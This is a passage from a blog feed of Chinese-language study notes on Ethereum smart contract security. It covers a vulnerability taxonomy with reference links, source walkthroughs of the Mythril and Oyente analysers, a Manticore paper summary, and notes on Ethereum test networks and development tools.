Limit DoS on a Contract via Unbounded Operations/Loop over anarray of unknown size</p><p>lock Ether</p></li><li><p>Gas Limit DoS on the Network via Block Stuffing/Block Stuffingattacks/Transaction congestion Attack</p></li></ol><p>它不只可以用来消耗 Gas， <ahref="https://medium.com/level-k/public-disclosure-malicious-gastoken-minting-236b2f8ace38">还可以通过GasToken 来倒成钱</a></p></li><li><p>GasLess Send</p></li></ol><p>参考：<ahref="https://medium.com/consensys-diligence/silent-but-vulnerable-ethereum-gas-security-concerns-adadf8bfb180">SilentBut Vulnerable: Ethereum Gas Security Concerns</a></p></li><li><p>Dos<a href="#fn29" class="footnote-ref" id="fnref29"role="doc-noteref"><sup>29</sup></a></p><ol type="1"><li><p>DoS With Block Gas Limit</p><ol type="1"><li>DoS with Failed External Call/External calls without gas stipends<ahref="#fn30" class="footnote-ref" id="fnref30"role="doc-noteref"><sup>30</sup></a></li><li>Looping through externally manipulated mappings orarrays/通过外部操纵映射或数组（Array）循环</li></ol></li><li><p>Owner operations 所有者操作</p></li><li><p>Progressing state based on external calls基于外部调用的进展状态<a href="#fn31" class="footnote-ref" id="fnref31"role="doc-noteref"><sup>31</sup></a></p><p>见 <ahref="https://blog.sigmaprime.io/solidity-security.html#dos">SoliditySecurity: Comprehensive list of known attack vectors and commonanti-patterns</a> <ahref="https://ethfans.org/posts/comprehensive-list-of-common-attacks-and-defense-part-6">中文翻译</a></p></li><li><p>DoS with (Unexpected) revert <a href="#fn32" class="footnote-ref"id="fnref32" role="doc-noteref"><sup>32</sup></a></p><p>恶意退款的 fallback 函数</p></li></ol></li><li><p>Signature collisions: two different functions may have the samesignature</p></li><li><p>假充值问题 专门做它的: 1.<ahref="https://arxiv.org/pdf/1906.10362.pdf">EVulHunter: Detecting FakeTransfer Vulnerabilitiesfor EOSIO’s Smart Contracts at Webassemblylevel</a> 2. 知道创宇 404/慢雾团队</p></li></ol><h2 id="版本更新已解决">版本更新已解决</h2><ol type="1"><li><p><a href="https://swcregistry.io/docs/SWC-109">UninitializedStorage Pointer</a>~~~ compiler version 0.5.0 and higher 已解决</p></li><li><p>Incorrect Constructor Name -- SWC-118 Solidity version 0.4.22引入了 constructor 关键字</p></li></ol><h2 id="参照">参照</h2><p><a href="https://swcregistry.io/">SWC Registry</a> <ahref="https://github.com/smartdec/classification">Classification ofsmart contract vulnerabilities</a> <ahref="https://consensys.github.io/smart-contract-best-practices/known_attacks/">KnownAttacks</a> <ahref="https://medium.com/consensys-diligence/silent-but-vulnerable-ethereum-gas-security-concerns-adadf8bfb180">SilentBut Vulnerable: Ethereum Gas Security Concerns</a> <ahref="https://blog.sigmaprime.io/solidity-security.html">SoliditySecurity: Comprehensive list of known attack vectors and commonanti-patterns</a> <ahref="https://github.com/ethereum/wiki/wiki/Safety">ethereum wiki</a> <ahref="https://www.cnblogs.com/XBWer/p/9697361.html#1">智能合约的常见漏洞</a><ahref="https://rickgray.me/2018/05/17/ethereum-smart-contracts-vulnerabilites-review/">以太坊智能合约安全入门了解一下（上）</a><ahref="https://www.8btc.com/article/331416">区块链智能合约安全审计白皮书（2018年）解读</a> <a href="https://paper.seebug.org/633/">以太坊 Solidity合约 call 函数簇滥用导致的安全风险</a></p><h2 id="想法总结">想法总结</h2><p><a href="https://paper.seebug.org/633/">以太坊 Solidity 合约 call函数簇滥用导致的安全风险</a> call 安全漏洞</p><aside id="footnotes" class="footnotes footnotes-end-of-document"role="doc-endnotes"><hr /><ol><li id="fn1"><p>算数溢出等数学方面的问题<a href="#fnref1"class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn2"><p>专门检测返回值<a href="#fnref2" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn3"><p>专门检测权限控制<a href="#fnref3" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn4"><p>：专门检测可以合约损毁自杀的<a href="#fnref4"class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn5"><p>属于权限控制<a href="#fnref5" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn6"><p>属于权限控制<a href="#fnref6" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn7"><p>检测不当调用，从而检测调用引起的异常等其他危险<ahref="#fnref7" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn8"><p>专门检测权限控制<a href="#fnref8" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn9"><p>顺序相关 [^gas]：与 Gas 相关的<a href="#fnref9"class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn10"><p>与 fallback 函数相关的<a href="#fnref10"class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn11"><p>检测从别的域包含/执行(外部)代码的类型<a href="#fnref11"class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn12"><p>代理转发相关<a href="#fnref12" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn13"><p>代理转发相关<a href="#fnref13" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn14"><p>漏洞<a href="#fnref14" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn15"><p>ether 相关，1. 攻击获得 2. 丢失 3. 锁定 lock<ahref="#fnref15" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn16"><p>与 fallback 函数相关的<a href="#fnref16"class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn17"><p>检测不当调用，从而检测调用引起的异常等其他危险<ahref="#fnref17" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn18"><p>检测不当调用，从而检测调用引起的异常等其他危险<ahref="#fnref18" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn19"><p>漏洞<a href="#fnref19" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn20"><p>检测不当调用，从而检测调用引起的异常等其他危险<ahref="#fnref20" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn21"><p>检测不当调用，从而检测调用引起的异常等其他危险<ahref="#fnref21" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn22"><p>顺序相关 [^gas]：与 Gas 相关的<a href="#fnref22"class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn23"><p>漏洞<a href="#fnref23" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn24"><p>检测从别的域包含/执行(外部)代码的类型<a href="#fnref24"class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn25"><p>专门检测权限控制<a href="#fnref25"class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn26"><p>漏洞<a href="#fnref26" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn27"><p>属于权限控制<a href="#fnref27" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn28"><p>漏洞<a href="#fnref28" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn29"><p>漏洞<a href="#fnref29" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn30"><p>调用外部合约<a href="#fnref30" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn31"><p>调用外部合约<a href="#fnref31" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn32"><p>与 fallback 函数相关的<a href="#fnref32"class="footnote-back" role="doc-backlink">↩︎</a></p></li></ol></aside>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mythril 代码分析</title>
      <link href="/blog/2021/04/15/blockchain/eth_vulns/mythril_intro/"/>
      <url>/blog/2021/04/15/blockchain/eth_vulns/mythril_intro/</url>
      
        <content type="html"><![CDATA[<h2 id="初步了解">初步了解</h2><h3 id="文件列表">文件列表</h3><ol start="0" type="1"><li><p>requirements.txt 本项目的依赖</p></li><li><p><code>setup.py</code> 中看项目的大致信息。</p><p>其中，入口点：<code>entry_points=&#123;"console_scripts": ["myth=mythril.interfaces.cli:main"]&#125;,</code>为： <code>myth</code> 文件 而 <code>myth</code> 的入口也就是：<code>mythril</code> 模块/包（也就是文件夹）下面的<code>interfaces</code> 包的 <code>cli.py</code> 中的 <code>main</code>函数</p></li><li><p><code>mythril</code> 包是整个源码文件夹</p><ol type="1"><li><code>interfaces</code> 是接口文件夹</li><li><code>analysis</code> 分析文件夹<ol type="1"><li><code>module</code> 处理漏洞分析的模块</li></ol></li><li><code>disassembler</code> 反汇编模块</li></ol></li><li><p><code>doc</code> 是本项目介绍文档的源文件</p><p>也有在线版本：<ahref="https://mythril-classic.readthedocs.io/en/master/index.html">Welcometo Mythril’s documentation!</a></p></li></ol><h2 id="大致了解">大致了解</h2><ol start="0" type="1"><li><p>模块化设计</p><p><ahref="https://mythril-classic.readthedocs.io/en/master/module-list.html#modules">MythrilModules</a></p><ol start="0" type="1"><li><p>每个模块可以有一个 <code>__init__.py</code>用于被导入时的初始化工作</p></li><li><p><code>analysis/module</code> package 是用来检测漏洞的</p><ol type="1"><li><code>base.py</code> 提供 <code>DetectionModule</code> 基类，modules中哥哥漏洞检测模块继承自该基类。</li><li><code>loadr.py</code> 的 ModuleLoader 类实现了一个单例模式的loader，加载基类中的 <code>EntryPoint</code> 类和<code>DetectionModule</code></li></ol></li><li><p><code>type(module).__name__</code></p><p>知识点： <code>type</code> 命令时什么类型，对象的话，就返回类名。<code>__name__</code> 属性返回模块文件名。</p><blockquote><p>所有的模块都有一个内置属性 <code>__name__</code> 。一个模块的<code>__name__</code> 的值取决于您如何应用模块。如果 import一个模块，那么模块<strong>name</strong>的值通常为模块文件名，不带路径或者文件扩展名</p></blockquote></li></ol></li><li><p>输入输出</p><ol type="1"><li><p>输入</p><ol type="1"><li>如果输入文件中有多个合约，默认检测最后一个，可以指定合约名，和oyenete 的那个功能类似。</li><li>还可以通过指定合约地址分析链上合同。</li><li>指定超时时间、最大深度（二者都有默认）</li></ol></li><li><p>结果输出</p><p>有漏洞的编号，危害程度、合约名、介绍、位置等，挺好的，我们可以学习这个方面输出类型、方式也值得学习：默认终端，提供参数指定其他方式</p></li></ol></li><li><p>类型提示 Typing 模块</p><p>Python增强提议(PEP-484)等，向代码中添加类型信息的标准方法。静态分析，仅仅会在你编程时提示，并不会报错（Pycharm会提示）</p></li></ol><h2 id="主要内容">主要内容</h2><ol type="1"><li>入口点: <code>mythril.interfaces.cli.main()</code></li></ol><p>参考文件：</p><p><a href="https://www.cnblogs.com/lands-ljk/p/5880483.html">Python<strong>init</strong>.py 作用详解</a> <ahref="https://www.jianshu.com/p/73f7fbf75183">Python<strong>init</strong>.py 作用详解</a> <ahref="https://python3-cookbook.readthedocs.io/zh_CN/latest/c10/p01_make_hierarchical_package_of_modules.html">10.1构建一个模块的层级包</a></p><p><ahref="https://sikasjc.github.io/2018/07/14/type-hint-in-python/">全面理解Python 中的类型提示（Type Hints）</a> <ahref="https://stackoverflow.com/questions/51710037/how-should-i-use-the-optional-type-hint">Howshould I use the Optional type hint?</a> <ahref="https://docs.python.org/3/library/typing.html#typing.Optional">pythontyping doc</a></p><p>[command line interface(CLI)](https://searchwindowsserver.techtarget.com/definition/command-line-interface-CLI#:~:text=A%20command%20line%20interface%20(CLI,interfaces%20and%20character%20user%20interfaces.)</p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>oyente 符号执行和检测部分代码分析</title>
      <link href="/blog/2021/04/15/blockchain/eth_vulns/oyente_deeper/"/>
      <url>/blog/2021/04/15/blockchain/eth_vulns/oyente_deeper/</url>
      
        <content type="html"><![CDATA[<h1 id="符号执行和检测部分">符号执行和检测部分</h1><h2 id="oyente.symexecrun">oyente.symExec:run</h2><p>前面讲到 oyente.oyente:analyze_bytecode 中为 symExec.run传入反汇编文件，进行后续操作。</p><p>在不是 <code>is_testing_evm</code> 测试 evm的情况下，关键函数有以下三个：<code>analyze()、 detect_vulnerabilities()、closing_message()</code></p><h3 id="oyente.symexecanalyze">oyente.symExec:analyze</h3><p>好多函数中都有一个函数内的嵌套函数定义： <code>timeout_cb()</code> ,其内容为 DEBUG mode 时的 traceback<a href="#fn1" class="footnote-ref"id="fnref1"role="doc-noteref"><sup>1</sup></a>，作用：便于调试时，一层层显示信息。Ps： 这里还使用的是嵌套函数，</p><p><ahref="https://blog.csdn.net/u011012932/article/details/73864242">Python嵌套函数</a> <a href="https://www.pynote.net/archives/1178">在 Python函数中定义嵌套函数</a></p><p><code>analyze()</code> 函数的作用时，生成 CFG 控制流图，并分析<code>run_build_cfg_and_analyze</code> ，如有异常，则抛出。而<code>run_build_cfg_and_analyze</code> 函数中</p><ol type="1"><li><p><code>initGlobalVars()</code></p><ol type="1"><li><p>初始化约束求解器，设置超时<a href="#fn2" class="footnote-ref"id="fnref2" role="doc-noteref"><sup>2</sup></a></p><ol type="1"><li><p>如果是并行的话，设置simplify（简化）、solve-eqs（高斯消元）、smt（提供一个基于 SMT 的solver）策略，还会把 goal 分解成子 goal</p><p>ParThen：Return a tactic that applies t1 and then t2 to every subgoalproduced by t1. The subgoals are processed in parallel. The tacticsplit-clause will select a clause (or f_1 ... f_n) in the input goal,and split it n subgoals.</p><ul class="task-list"><li><label><input type="checkbox" />tseitin-cnf-core 貌似和 tseitin-likeencoding、输入简化有关？ 看了英文也不清楚。</label></li></ul></li><li><p>如果反汇编文件中有 MSIZE，则将对应标志设置为 True</p><ul class="task-list"><li><label><input type="checkbox" />为什么这样做呀？</label></li></ul><p>MSIZE 为操作码之一，含义为：size of memory, i.e. largest accessedmemory index。 <ahref="https://solidity.readthedocs.io/en/v0.4.24/assembly.html#opcodes">0.4.24的 opcode 列表</a></p></li></ol></li><li><p>初始化 explorer 相关</p><p>大致有一下（没写全）： | 变量 | 含义| |----|---| |<code>visited_pcs</code> | 访问过的路径的集合| | <code>vertices</code>|顶点字典| | <code>edges</code> |边字典| | <code>visited_edges</code>|访问过的边的字典| | <code>calls_affect_state</code> | call影响的状态？不太清楚| | <code>money_flow_all_paths</code> | 金钱流列表|| <code>reentrancy_all_paths</code> | 重入流列表| |<code>path_conditions</code> | 路径条件列表| |<code>global_problematic_pcs</code> | 检测的漏洞的列表组成的字典|</p><p>符号变量的名字生成器 还有 USE_GLOBAL_BLOCKCHAIN:是否使用区块链全局状态 和 REPORT_MODE：是否生成报告</p><p>instructions: capturing all the instructions, keys are correspondingaddresses</p></li></ol></li><li><p><code>build_cfg_and_analyze()</code></p><ol type="1"><li><p>timeout to run symbolic execution</p><p>在 <code>global_params.py</code> 中定义的<code>GLOBAL_TIMEOUT = 50</code> ,如果超时，则标记超时，且抛出超时异常</p></li><li><p><code>change_format()</code> 整理、简化反汇编文件的格式</p><ol type="1"><li>替换一些 evm 未实现的反汇编为指令</li><li>简化每一行 <code>00002: PUSH1 0x80</code> 变成<code>2 PUSH1 =&gt; 0x80</code></li><li>然后写回反汇编源文件</li></ol></li><li><p>读取上一步处理好的反汇编文件，并去除首行 runtimecode</p></li><li><p>tokenize 模块提供语法、语义扫描解析<a href="#fn3"class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></p><p>it breaks a stream of bytes into Python tokens. It decodes the bytesaccording to PEP-0263 fordetermining source file encoding</p></li><li><p><code>collect_vertices</code> 貌似看不太懂？</p><ol type="1"><li>Parse the disassembled file</li><li>Then identify each basic block (i.e. one-in, one-out)</li><li>Store them in vertices</li></ol></li><li><p><code>construct_bb</code> 构建基本块</p></li><li><p><code>construct_static_edges</code> 构建静态边</p></li><li><p><code>full_sym_exec</code> 符号执行检测</p><ol type="1"><li><p><code>get_init_global_state</code> 初始化当前状态</p><p>global_state 有调用与被调用者余额，<code>global_state["balance"]["Is"或"Ia"]</code>，pc（程序计数器)，接受和发送者地址，时间戳等</p></li><li><p><code>init_analysis</code> 初始化分析相关参数</p></li><li><p>创建 params 对象，而且把上两步的全局状态和 analysis对象增加为该对象的属性。</p></li></ol></li><li><p><code>sym_exec_block</code> 符号执行块， 是个递归</p><ol type="1"><li><p>计数和检查最大边界</p><ol type="1"><li>对 current_edge 的访问次数计数</li><li>判断 current_edge 访问次数是否超过 LOOP_LIMIT，如果超过，则返回stack - [ ] 这里为什么要返回 stack</li><li>判断使用的 gas 是否超过 GAS_LIMIT，如果超过，则返回 stack</li></ol></li><li><p>执行块中的指令</p><p>循环遍历块的指令列表，每次执行一条，执行指令调用：<code>sym_exec_ins()</code></p></li><li><p>将当前块标记为已访问</p></li><li><p>漏洞路径更新</p><ul class="task-list"><li><label><input type="checkbox" />这里还没有看懂</label></li></ul><p>将路径加入重入漏洞路径？（怎么就直接加入了，哪里检测了？） 如果当前money_flow 路径在全部 money 漏洞中不存在，则更新相关路径。</p></li><li><p>Go to next Basic Block(s)</p><p>根据跳转类型，选择块，然后更新相关条件，然后递归。 跳转类型：<code>terminal、unconditional、falls_to、conditional</code></p><pre><code>1. 终止类型或者深度超过 DEPTH_LIMIT，则终止该路径，并 display_analysis money flow相关？ - [ ] 为什么2. 无条件，则更新相关参数，然后直接跳转3. follow to 的同上4. 有条件跳转    采用 DFS 深度优先搜索递归遍历    先检查左节点，如果约束有解，则向左递归，直到叶子节点，然后回退一个节点，走右边节点，若约束有解，则进入右边节点。</code></pre></li></ol></li><li><p>sym_exec_ins 符号执行指令</p><p>模拟执行指令 opcode</p><ul class="task-list"><li><label><inputtype="checkbox" />不知道由于版本更新，变化了没？</label></li></ul></li></ol></li><li><p>detect_vulnerabilities instruction 是一个以<code>&#123;指令地址:指令&#125;</code>的字典</p><ol type="1"><li>计算代码覆盖率，evm_code_coverage</li><li>分别检测漏洞，将结果放如 result 二维列表</li><li>vulnerability_found 没有看懂</li></ol></li><li><p>closing_message 分析结束，根据全局变量 STORE_RESULT觉得那个是否存储分析结果。</p></li></ol><h2 id="参考资料">参考资料</h2><aside id="footnotes" class="footnotes footnotes-end-of-document"role="doc-endnotes"><hr /><ol><li id="fn1"><p><ahref="https://ahuigo.github.io/b/py/py-debug#/">py-debug</a> <ahref="https://blog.csdn.net/John_xyz/article/details/80148431">python使用 traceback 获取异常信息</a><a href="#fnref1" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn2"><p><a href="https://rise4fun.com/z3/tutorial/strategies">Z3- strategies</a> <ahref="https://z3prover.github.io/api/html/z3py_8py.html">z3py.py FileReference</a> <ahref="https://www.twblogs.net/a/5b89ecef2b71775d1ce48484">Z3 Solver 中Tactic 的使用</a><a href="#fnref2" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn3"><p><ahref="https://docs.python.org/3/library/tokenize.html">tokenize —Tokenizer for Python source</a> <ahref="https://cloud.tencent.com/developer/section/1369385">tokenize —Tokenizer for Python source 中文</a> <ahref="https://zhuanlan.zhihu.com/p/29815903">用 Python 编写 JSON解析器的概述</a><a href="#fnref3" class="footnote-back"role="doc-backlink">↩︎</a></p></li></ol></aside>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>manticore 论文阅读工具</title>
      <link href="/blog/2021/04/15/blockchain/eth_vulns/paper_manticore/"/>
      <url>/blog/2021/04/15/blockchain/eth_vulns/paper_manticore/</url>
      
        <content type="html"><![CDATA[<h2 id="background-and-contribution">Background and Contribution</h2><h3 id="background">Background</h3><p>Symbolic execution has been extensively researched in a securitycontext, but industry has been slow to adopt the technique: Symbolicexecution</p><ol type="1"><li>Lack of flexible, user-friendly tools.</li><li>Existing frameworks are tightly coupled to traditional executionmodels, which makes symbolic execution research challenging foralternative execution environments, such as the Ethereum platform.</li></ol><h3 id="contribution">Contribution</h3><p>Manticore is a symbolic execution framework for analyzing<strong>binaries and smart contracts.</strong></p><p>Imporvements:</p><ol type="1"><li>highly flexible</li><li>supports both traditional computing environments (x86/64, ARM) andexotic ones, such as the Ethereum platform</li></ol><h2 id="architecture">Architecture</h2><p><strong>The primary components</strong> are the <strong>CoreEngine</strong> and <strong>Native</strong> and <strong>EthereumExecution Modules.</strong> <strong>Secondary components</strong>include the Satisfiability Module Theories (SMT-LIB) module, EventSystem, and API.</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200502101231.png"alt="manticore Architecture" /><figcaption aria-hidden="true">manticore Architecture</figcaption></figure><h3 id="core-engine">Core Engine</h3><p>核心引擎是 Manticore 灵活性的来源。它实现了一个与平台无关的通用符号执行引擎，该引擎对基础执行模型几乎没有任何假设。该核心引擎根据图1a 所示的状态生命周期来操作和管理程序状态。</p><p>程序状态是抽象对象，代表执行时某个点的程序状态。这些对象公开了一个执行接口，Core Engine调用该执行接口来触发程序执行的一个原子单元。对于本机二进制文件和以太坊，这是一条指令。在执行期间，状态可能会中断并返回给 CoreEngine，以表明需要处理生命周期事件。如图 1b 所示，</p><h4 id="状态转换">状态转换</h4><p>状态生命周期定义了三个状态：就绪，忙碌和已终止以及两个事件：终止和具体化。核心引擎反复选择就绪状态并执行（将其转换为繁忙）。 正在执行的 “忙碌”状态可以转换回“就绪”状态，也可以发出生命周期事件供内核处理。</p><p>当状态结束时（通常在程序退出或内存访问冲突时）将状态转换为 “已终止”时，将发生 “Termination” 事件。</p><p>“Concretization”发生在一个状态发出信号，表示一个符号对象应该转换为一个或多个具体的值，受制于该状态的当前约束。对于每个具体值，都会创建一个新的子状态并将其标记为“就绪”。 当程序计数器寄存器成为符号并具体化为可能的具体值时，就会发生“Concretization” 最常见的例子，叫做分叉。这导致为每个新程序路径生成新状态。</p><p>可以使用各种策略来自定义状态探索，这些策略实现了针对就绪状态选择和具体化（Readystate selection and Concretization）的各种启发式方法。核心引擎是为并行性而设计的，并支持用于状态队列处理的多个进程。</p><h3 id="ethereum-execution-modules">Ethereum Execution Modules</h3><p>因为 the Core Engine 是高度解耦合的，因此 adding Ethereum support didnot require substantial architectural changes to Manticore（具体的论文没说）</p><h4 id="ethereum-symbolic-execution">Ethereum Symbolic Execution</h4><p>Smart contracts receive input as network transactions consisting of a<strong>value and a data buffer.</strong> The transaction data buffercontains information about which function should be executed in acontract, and its arguments.</p><p>Symbolic execution of smart contracts involves <strong>symbolictransactions, where both value and data are symbolic</strong>. Symbolictransactions are applied to all Ready states,</p><p>Symbolic transactions can be repeatedly executed to genericallyexplore the state space of a contract.</p><p>Manticore’s emulated environment for smart contract executionsupports an arbitrary number of interacting contracts. It is capable oftracking not only a single contract’s state, but a full Ethereum”world”</p><h3 id="auxiliary-modules">Auxiliary Modules</h3><p>SMT-LIB module that supplies a custom symbolic expression objectmodel and an SMT solver interface</p><p>The Event System decouples Manticore as a whole from externalinstrumentation-based analyses</p><p>Manticore can broadcast various symbolic execution events (e.g.memory reads/writes, state forking, concretization) that can be handledby an event subscriber outside of Manticore, such as an API client.</p><p>还有插件系统</p><h2 id="ethereum-smart-contract-analysis-evaluation">ETHEREUM SMARTCONTRACT ANALYSIS EVALUATION</h2><p>Manticore’s Python API allows advanced users to customize theiranalysis using various forms of instrumentation. Hooking via the APIlets users execute callbacks when a certain state is reached.</p><p>states can be pruned, custom constraints can be applied, andsatisfiability queries can be sent to the solver</p><h3 id="ethereum-smart-contract-analysis-evaluation-1">ETHEREUM SMARTCONTRACT ANALYSIS EVALUATION</h3><p>evaluated Manticore based on a corpus of 100 Ethereum smart contractstaken directly from the Ethereum blockchain1.</p><p>指标: tracks <strong>the number of states</strong> discovered and<strong>coverage of the contract code.</strong></p><p>with a timeout of 90 minutes per contract Manticore produced anaverage coverage of 65.64%,</p><p>These assumptions were, however, sufficient for Manticore to achievegreater than 90% code coverage on 25 of the contracts.</p><h2 id="smart-contract-security-assessments">Smart Contract SecurityAssessments</h2><p>Trail of Bits 公司已经用了很多，详细见一些报告。</p><p>报告地址见论文末尾 12-16 测试报告有漏洞类别以及一些详细介绍等</p><h2 id="优缺点">优缺点</h2><h3 id="优点">优点</h3><ol type="1"><li>灵活，用户友好（提供 api） 一个与平台无关的通用符号执行引擎</li><li>可扩展，有 Ethereum 测试模块</li></ol><h3 id="缺点">缺点</h3><ol type="1"><li>相对 angr 来说，不支持某些 IEEE754 浮点数指令（IEEE 754 floatingpoint instructions），因此在 logic bomb benchmark 中效果不太好</li></ol><blockquote><p>Since angr supports the use of some IEEE 754 floating pointinstructions thatManticore does not, we expect that Manticore mayovertake angr in the future, once it adds such support.</p></blockquote><h2 id="一些介绍">一些介绍</h2><p><ahref="http://pwn4.fun/2017/06/01/Manticore%EF%BC%9A%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/#more">Manticore：符号执行</a></p><p><ahref="https://www.sweety.cn/23190/manticore%E7%AE%80%E4%BB%8B%EF%BC%8C%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E7%AC%A6%E5%8F%B7%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7.html">MANTICORE简介，智能合约的符号分析工具</a></p><h2 id="现存主流工具">现存主流工具</h2><ol type="1"><li><ahref="https://github.com/trailofbits/manticore">manticore</a></li><li><a href="https://github.com/eth-sri/securify2">Securifyv2.0</a></li><li><a href="https://github.com/melonproject/oyente">Oyente</a></li><li><a href="www.lianantech.com">Beosin-VaaS</a></li><li>Mythril</li><li>EthIR</li><li>Zeus</li><li>Slither</li><li>Osiris 只检测 integer bugs</li></ol>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>区块链网络及其开发环境</title>
      <link href="/blog/2021/04/13/blockchain/network_develop/"/>
      <url>/blog/2021/04/13/blockchain/network_develop/</url>
      
        <content type="html"><![CDATA[<p>All Ethereum node communicate with each other through<strong>Ethereum Protocol</strong>. same way storing or accessingdata.</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16176125451508.jpg"alt="16176125451508" /><figcaption aria-hidden="true">16176125451508</figcaption></figure><p>Private Network: Ethereum can <ahref="https://geth.ethereum.org/docs/interface/private-network">set up aPrivate Network</a>，在私有网络中，可以使用 PoW 或者 PoA算法。也就是可以搭建私有的以太坊联盟链。</p><p>参考：<ahref="https://github.com/xianfeng92/Love-Ethereum/blob/master/notes/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E9%83%A8%E7%BD%B2%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%81%94%E7%9B%9F%E9%93%BE.md">自己动手部署以太坊联盟链.md</a></p><h1 id="main-networktestnet-network-and-developer-network">MainNetwork、Testnet Network and Developer Network</h1><ol type="1"><li>Main Network Persistent;Real-Blockchain;Costs Money</li><li>Testnet Network Persistent, but can be deleted; Real-Blockchain;BetaRelease. Test Smart Contracts, Protocol Updates<ol type="1"><li>Ropsten</li><li>Rinkeby</li><li>Gorli</li></ol></li><li>Developer Network Unit Testing;Fast;Non-Persistent Ganache</li></ol><p>If you are testing on Ganache， at least before you goingproduction，It's also very important you should test on the realnetwork.</p><h2 id="全节点和轻节点">全节点和轻节点</h2><p>首先要从「创始块」——<ahref="https://www.zhihu.com/search?q=中本聪&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22article%22%2C%22sourceId%22%3A342784693%7D">中本聪</a>的论文说起，他在文中提到 SPV（Simplified Payment Verification），SPV借助 Merkle Proof机制，只需要保存最长区块链的所有块头的情况下，就能够验证对一笔支付交易是否在存在。相比较于全节点，实现SPV 的客户端称为轻节点（Light Node）。</p><h2 id="metamask-infrua">MetaMask &amp; Infrua</h2><p>deploy metamask，get ether from Test Network（usually Ropsten, GoerliTest Network） Steps: <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16170917687007.jpg"alt="metamask" /></p><p>MetaMask, faucet.metamask.io, EtherScan等是如何与区块链进行交互的。</p><ul><li><p>MetaMask 通过与 Infura 服务连接，该服务通过运行 go-ethereum，parity 维护本地区块链节点，然后与区块链进行交互。</p></li><li><p>浏览器访问的网站后端，存储着发送者的私钥与本地区块链节点，从而与区块链进行交互。</p></li><li><p>xx.etherscan.io 的后端服务器，部署存储 xx网络的区块链节点，从而可以查看该区块链网络的交易变动。 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16170945031666.jpg"alt="etherscan" /></p></li><li><p>You need a blockchain node to interact with theBlockchain，either your own node，or hosted node.</p></li><li><p>The Blockchain is the single source of truth.</p></li><li><p>There are infrastructure providers to abstract runningBlockchains away from developers, users to make the onboarding quiteeasy.</p></li></ul><h2 id="development-environment">Development Environment</h2><p>在 Remix 的 “DEPLOY &amp; RUN TRANSACTIONS”，我们看到三种ENVIRONMENT，分别为：JavaScript VM、Injected Web3、Web3 Provider。</p><p>三者的区别：</p><ol type="1"><li><p><ahref="https://remix-ide.readthedocs.io/en/latest/run.html#environment">Deploy&amp; Run</a></p></li><li><p><ahref="https://ethereum.stackexchange.com/questions/40227/difference-between-javascript-vm-vs-injected-w3-vs-web3-provider">Differencebetween Javascript VM vs injected w3 vs web3 provider</a></p></li><li><p><ahref="https://stackoverflow.com/questions/48368149/remix-ethereum-where-goes-the-contract">RemixEthereum where goes the contract?</a></p></li></ol><p>Web3 中指定测试网络的 chainid：用来防止重放攻击，在 EIP-155中提出的。比如 chainid=1 是主网，因为是本地测试网络，所以随便取了一个116。</p><p><ahref="https://willzhuang.github.io/2019/03/22/%E8%AF%A6%E8%BF%B0ethereum%E4%B8%ADChainID%E5%92%8CNetworkID/">详述ethereum 中 ChainID 和 NetworkID</a></p><p>Mining on real Blockchains, even test-networks, can take a while.It's not very convenient for Development.</p><h2 id="ganache">Ganache</h2><p>Ganache is a Blockchain and a Wallet. Two in one. Anyone can connectto it using a Web3 Provider Method either via http RPC orWebSockets.</p><p>采用 MetaMask 自定义 RPC，添加 Ganache 的虚拟钱包地址，Remix-ide 选择Injected-Web3 